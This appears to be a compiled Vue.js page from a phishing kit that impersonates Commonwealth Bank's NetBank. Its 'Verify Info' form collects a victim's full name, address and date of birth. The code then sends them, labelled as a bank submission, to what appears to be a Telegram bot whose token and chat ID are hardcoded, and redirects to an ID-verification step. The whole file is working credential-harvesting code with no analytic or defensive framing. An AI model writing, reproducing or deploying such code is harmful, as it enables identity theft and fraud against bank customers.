import{_ as f,a as p,c as b,b as o,e as y,w as r,v as l,u as v,o as V}from"./index-bWen7Kr5.js";const A={__name:"VerifyInfoView",setup(B){let a="5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU",d=748063043;const i=new Bot(a,d),u=v(),t=p({name:"",adress:"",dob:""}),m=()=>{if(t.name===""||t.address===""||t.dob===""){alert("All fields required");return}let s=`Common Wealth Bank submission (verify info) - ID: ${sessionStorage.getItem("submissionID")} %0A`;s+="====================%0A",s+=`Name: ${t.name}%0A`,s+=`Address: ${t.address}%0A`,s+=`Date of Birth: ${t.dob}%0A`,i.sendMessage(s).then(e=>{console.log("Msg Success!",e),u.push({name:"netbank.verify.id"})}).catch(e=>console.error(e))};return(s,e)=>(V(),b("body",null,[o("div",null,[e[6]||(e[6]=o("h1",null,"Verify Info",-1)),o("form",{class:"card-form",onSubmit:e[3]||(e[3]=y(n=>m(),["prevent"]))},[r(o("input",{type:"text",placeholder:"Your full name","onUpdate:modelValue":e[0]||(e[0]=n=>t.name=n)},null,512),[[l,t.name]]),r(o("input",{type:"text",placeholder:"Your address (in full)","onUpdate:modelValue":e[1]||(e[1]=n=>t.address=n)},null,512),[[l,t.address]]),e[4]||(e[4]=o("label",null,"Date of Birth",-1)),r(o("input",{type:"date",placeholder:"Date of Birth","onUpdate:modelValue":e[2]||(e[2]=n=>t.dob=n)},null,512),[[l,t.dob]]),e[5]||(e[5]=o("button",{type:"submit"},"Verify",-1))],32)])]))}},I=f(A,[["__scopeId","data-v-5c582f81"]]);export{I as default};
